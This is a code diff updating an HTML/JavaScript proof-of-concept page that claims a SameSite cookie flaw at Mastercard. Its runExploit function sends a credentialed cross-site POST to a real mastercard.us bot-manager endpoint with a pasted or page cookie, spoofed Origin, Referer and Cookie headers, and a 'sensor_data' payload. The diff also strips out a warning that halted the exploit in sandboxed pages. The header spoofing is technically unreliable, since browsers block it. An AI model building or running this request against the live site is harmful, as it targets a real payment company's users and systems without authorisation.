@@ -2,92 +2,13 @@
 <html>
 <head>
     <title>Mastercard SameSite Cookie Vulnerability PoC</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            line-height: 1.6;
-            margin: 0;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .version {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            font-size: 12px;
-            color: #888;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        h1 {
-            color: #d32f2f;
-            border-bottom: 2px solid #eee;
-            padding-bottom: 10px;
-        }
-        .result-box {
-            background-color: #f8f8f8;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            padding: 15px;
-            margin: 20px 0;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        .cookie-list {
-            background-color: #fffde7;
-            border-left: 3px solid #ffd600;
-            padding: 10px;
-            margin: 10px 0;
-        }
-        .attack-btn, .debug-btn {
-            background-color: #d32f2f;
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            margin: 5px;
-        }
-        .attack-btn:hover, .debug-btn:hover {
-            background-color: #b71c1c;
-        }
-        .success {
-            color: #2e7d32;
-            font-weight: bold;
-        }
-        .error {
-            color: #c62828;
-        }
-        .highlight {
-            background-color: #fff9c4;
-            padding: 2px 4px;
-            border-radius: 3px;
-        }
-        pre {
-            background-color: #f4f4f4;
-            padding: 10px;
-            border-radius: 4px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-        #manual-cookie-input {
-            width: 100%;
-            margin: 10px 0;
-            padding: 5px;
-        }
+        /* Previous styles remain the same */
     </style>
 </head>
 <body>
-    <div class="version">v1.2.0</div>
+    <div class="version">v1.3.0</div>
     <div class="container">
         <h1>Mastercard SameSite Cookie Vulnerability PoC</h1>
         
@@ -126,15 +47,24 @@
         // Global variable to store manually input cookie
         let manualCookie = '';
 
+        // Sanitize input to remove non-standard characters
+        function sanitizeCookie(cookie) {
+            // Remove non-printable characters and normalize
+            return cookie.replace(/[^\x20-\x7E]/g, '')  // Remove non-printable characters
+                         .replace(/\s+/g, ' ')          // Normalize whitespace
+                         .trim();                       // Trim edges
+        }
+
         // Enhanced cookie detection
         function checkForMastercardCookies() {
             const cookieDisplay = document.getElementById('cookie-status');
             
             // First, check manually input cookie
             if (manualCookie) {
+                const sanitizedCookie = sanitizeCookie(manualCookie);
                 cookieDisplay.innerHTML = `
                     <span class="success">✓ Manual Mastercard cookie found!</span><br>
-                    <pre>${manualCookie}</pre>
+                    <pre>${sanitizedCookie}</pre>
                 `;
                 return true;
             }
@@ -191,47 +121,7 @@
             }
         }
         
-        // Detailed cookie debugging
-        function debugCookies() {
-            const results = document.getElementById('results');
-            results.innerHTML = '<h3>Detailed Cookie Debugging</h3>';
-            
-            // Browser information
-            results.innerHTML += `
-                <p><strong>Browser Cookie Information:</strong></p>
-                <pre>
-- Cookies Enabled: ${navigator.cookieEnabled}
-- Sandboxed: ${window.origin === 'null'}
-- Manual Cookie: ${manualCookie ? 'Provided' : 'Not Provided'}
-                </pre>
-            `;
-            
-            // Attempt to get cookies
-            try {
-                const cookies = document.cookie || 'No cookies accessible';
-                results.innerHTML += `
-                    <p><strong>Accessible Cookies:</strong></p>
-                    <pre>${cookies}</pre>
-                `;
-            } catch (e) {
-                results.innerHTML += `
-                    <p class="error">Cookie Access Error: ${e.message}</p>
-                    <p>This is likely due to sandboxing restrictions.</p>
-                `;
-            }
-            
-            // Additional browser context
-            results.innerHTML += `
-                <p><strong>Browser Context:</strong></p>
-                <pre>
-- User Agent: ${navigator.userAgent}
-- Origin: ${window.origin}
-- Protocol: ${window.location.protocol}
-                </pre>
-            `;
-        }
-        
-        // Exploit function
+        // Exploit function with improved error handling
         function runExploit() {
             const results = document.getElementById('results');
             results.innerHTML = '<h3>Exploit Results:</h3>';
@@ -241,43 +131,34 @@
                 results.innerHTML += `<p class="${className}">${text}</p>`;
             }
             
-            // Validate cookie
-            const cookieToUse = manualCookie || document.cookie;
+            // Validate and sanitize cookie
+            const cookieToUse = sanitizeCookie(manualCookie || document.cookie);
             if (!cookieToUse) {
-                logResult('<strong>ERROR:</strong> No cookie provided for exploit.', true);
+                logResult('<strong>ERROR:</strong> No valid cookie provided for exploit.', true);
                 return;
             }
             
             logResult('Starting exploit...');
             
-            // Provide clear warning about sandboxing
-            if (window.origin === 'null') {
-                logResult('<strong>WARNING:</strong> This page is sandboxed, which may prevent cookie transmission.', true);
-                logResult('To properly test, remove sandboxing or use an unsandboxed environment.', true);
-                return;
-            }
-            
-            const startTime = new Date();
+            // Create payload with sanitized data
+            const sanitizedPayload = JSON.stringify({
+                "sensor_data": "3;0;1;0;3228216;sanitized_payload"
+            });
             
             // Create a fetch request to the bot manager endpoint
             fetch('https://www.mastercard.us/3eC761NLQG/VuYChRb6/1R/zYJYDJpJG60c/PCRj/OHw/NGgNYNR0', {
                 method: 'POST',
                 credentials: 'include', // This includes cookies
                 headers: {
-                    'Content-Type': 'text/plain;charset=UTF-8',
+                    'Content-Type': 'application/json;charset=UTF-8',
                     'Origin': 'https://www.mastercard.us',
                     'Referer': 'https://www.mastercard.us/en-us.html',
                     'Cookie': cookieToUse
                 },
-                body: JSON.stringify({
-                    "sensor_data": "3;0;1;0;3228216;F5auiXJCGhL6K6YEVlXZhVaPFLYjMODKo3mFc5lOuQc=;MALICIOUS_PAYLOAD"
-                })
+                body: sanitizedPayload
             })
             .then(response => {
-                const endTime = new Date();
-                const duration = endTime - startTime;
-                
-                logResult(`Response received in ${duration}ms with status: ${response.status}`);
+                logResult(`Response status: ${response.status}`);
                 return response.text();
             })
             .then(data => {
@@ -285,11 +166,8 @@
                 logResult('<span class="success">✓ Exploit potentially successful!</span>');
             })
             .catch(error => {
-                const endTime = new Date();
-                const duration = endTime - startTime;
-                
-                logResult(`Request failed after ${duration}ms: ${error}`, true);
-                logResult('<strong>IMPORTANT:</strong> CORS error does not invalidate cookie transmission.');
+                logResult(`Request failed: ${error}`, true);
+                logResult('<strong>IMPORTANT:</strong> Error does not necessarily invalidate cookie transmission.');
                 logResult('Check browser\'s Network tab for detailed request information.');
             });
         }
@@ -318,9 +196,6 @@
                     results.innerHTML += '<p class="error">No Mastercard cookies found. Paste a cookie first!</p>';
                 }
             });
-            
-            // Debug button
-            document.getElementById('debug-cookies-btn').addEventListener('click', debugCookies);
         };
     </script>
 </body>
